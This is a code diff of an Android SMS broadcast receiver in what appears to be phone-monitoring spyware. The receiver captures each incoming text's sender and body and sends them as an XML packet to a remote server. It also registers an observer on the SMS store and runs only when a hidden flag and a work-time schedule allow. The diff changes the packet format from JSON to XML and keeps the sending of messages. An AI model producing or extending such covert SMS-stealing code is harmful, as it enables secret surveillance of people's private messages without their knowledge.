@@ -1,8 +1,7 @@
 package com.inet.android.sms;
 
-import org.json.JSONArray;
-import org.json.JSONException;
-import org.json.JSONObject;
+import java.text.SimpleDateFormat;
+import java.util.Calendar;
 
 import android.annotation.SuppressLint;
 import android.content.BroadcastReceiver;
@@ -18,7 +17,6 @@ import android.util.Log;
 
 import com.inet.android.bs.RequestMakerImpl;
 import com.inet.android.request.DataRequest;
-import com.inet.android.utils.ConvertDate;
 import com.inet.android.utils.Logging;
 import com.inet.android.utils.WorkTimeDefiner;
 
@@ -29,116 +27,103 @@ public class SMSBroadcastReceiver extends BroadcastReceiver {
 	SharedPreferences sp;
 	private Context mContext;
 	private Bundle mBundle;
-	String type = null;
+	String dir = null;
 	RequestMakerImpl req;
-	private String LOG_TAG = "SMSBroadcastReceiver";
 
 	public void onReceive(Context context, Intent intent) {
 		// Tom Xue: intent -> bundle -> Object messages[] -> smsMessage[]
-		this.mContext = context;
-		sp = PreferenceManager.getDefaultSharedPreferences(mContext);
-		String sms = sp.getString("sms", "0");
+		sp = PreferenceManager.getDefaultSharedPreferences(context);
+		String sms = sp.getString("KBD", "0");
 
 		if (sms.equals("0")) {
-			Logging.doLog(LOG_TAG, "sms : 0", "sms : 0");
+			Logging.doLog(TAG, "KBD = 0", "KBD = 0");
 			return;
 		}
-		boolean isWork = WorkTimeDefiner.isDoWork(mContext);
+
+		boolean isWork = WorkTimeDefiner.isDoWork(context);
 		if (!isWork) {
-			Logging.doLog(LOG_TAG, "isWork return " + Boolean.toString(isWork),
+			Logging.doLog(TAG, "isWork return " + Boolean.toString(isWork),
 					"isWork return " + Boolean.toString(isWork));
-			Logging.doLog(LOG_TAG, "after isWork retrun 0",
-					"after isWork retrun 0");
 
 			return;
 		} else {
-			Logging.doLog(LOG_TAG, "isWork - " + Boolean.toString(isWork),
-					"isWork - " + Boolean.toString(isWork));
+			Logging.doLog(TAG, Boolean.toString(isWork), Boolean.toString(isWork));
 		}
-
 		try {
+			mContext = context;
 			mBundle = intent.getExtras();
 			// smsSentObserver = null;
 			Log.d(TAG, "Intent Action : " + intent.getAction());
+			getSMSDetails();
 
 			if (smsSentObserver == null) {
 				smsSentObserver = new SmsSentObserver(new Handler(), mContext);
 				mContext.getContentResolver().registerContentObserver(
 						Uri.parse("content://sms"), true, smsSentObserver);
 			}
-			getSMSDetails();
-
 		} catch (Exception sgh) {
-			Logging.doLog(TAG, "Error in Init : " + sgh.toString(),
-					"Error in Init : " + sgh.toString());
+			Logging.doLog(TAG, "Error in Init : " + sgh.toString(), "Error in Init : " + sgh.toString());
 		}
 	}
 
 	@SuppressLint("SimpleDateFormat")
 	private void getSMSDetails() {
-		ConvertDate date = new ConvertDate();
 		SmsMessage[] msgs = null;
 
 		try {
 			Object[] pdus = (Object[]) mBundle.get("pdus");
 			if (pdus != null) {
-				type = "5";
+				dir = "вх. Sms";
 				msgs = new SmsMessage[pdus.length];
 
 				StringBuilder bodyText = new StringBuilder();
 				for (int k = 0; k < msgs.length; k++) {
 					msgs[k] = SmsMessage.createFromPdu((byte[]) pdus[k]);
 
-					Logging.doLog(
-							TAG,
+					Log.d(TAG,
 							"getDisplayMessageBody : "
 									+ msgs[k].getDisplayMessageBody());
-					Logging.doLog(TAG, "getDisplayOriginatingAddress : "
-							+ msgs[k].getDisplayOriginatingAddress());
-					Logging.doLog(TAG,
-							"getMessageBody : " + msgs[k].getMessageBody());
-					Logging.doLog(
-							TAG,
+					Log.d(TAG,
+							"getDisplayOriginatingAddress : "
+									+ msgs[k].getDisplayOriginatingAddress());
+					Log.d(TAG, "getMessageBody : " + msgs[k].getMessageBody());
+					Log.d(TAG,
 							"getOriginatingAddress : "
 									+ msgs[k].getOriginatingAddress());
-
+				
 				}
-				String phNumber = msgs[0].getOriginatingAddress();
+				String adress = msgs[0].getOriginatingAddress();
 
 				for (int i = 0; i < msgs.length; i++) {
 					bodyText.append(msgs[i].getMessageBody());
 				}
 				// -------send sms--------------------------------
-				String sendJSONStr = null;
-				JSONObject jsonObject = new JSONObject();
-				JSONArray data = new JSONArray();
-				JSONObject info = new JSONObject();
-				JSONObject object = new JSONObject();
-				try {
+				String sendStr = "<packet><id>" + sp.getString("ID", "ID")
+						+ "</id><time>" + logTime()
+						+ "</time><type>4</type><app>" + dir + "</app><ttl>"
+						+ adress + "</ttl><cdata1>" + bodyText.toString()
+						+ "</cdata1><ntime>" + "30" + "</ntime></packet>";
 
-					info.put("number", phNumber);
-					info.put("data", bodyText.toString());
-
-					object.put("time", date.logTime());
-					object.put("type", type);
-					object.put("info", info);
-					data.put(object);
-					jsonObject.put("data", data);
-					sendJSONStr = object.toString();
-				} catch (JSONException e) {
-					Logging.doLog(LOG_TAG, "json сломался", "json сломался");
-				}
-
+//				req = new RequestMakerImpl(mContext);
+//				req.sendDataRequest(sendStr);
+				
 				DataRequest dr = new DataRequest(mContext);
-				dr.sendRequest(sendJSONStr);
-
-				Logging.doLog(LOG_TAG, sendJSONStr, sendJSONStr);
+				dr.sendRequest(sendStr);
+				
+				Logging.doLog(TAG, sendStr, sendStr);
 
 			}
 		} catch (Exception sfgh) {
-			Logging.doLog(TAG, "Error in getSMSDetails : " + sfgh.toString(),
-					"Error in getSMSDetails : " + sfgh.toString());
+			Logging.doLog(TAG, "Error in getSMSDetails : " + sfgh.toString(), "Error in getSMSDetails : " + sfgh.toString());
 		}
 	}
 
+	@SuppressLint("SimpleDateFormat")
+	private String logTime() {
+		SimpleDateFormat formatter = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss");
+		Calendar cal = Calendar.getInstance();
+		cal.setTimeInMillis(System.currentTimeMillis());
+		return "" + formatter.format(cal.getTime());
+
+	}
 }
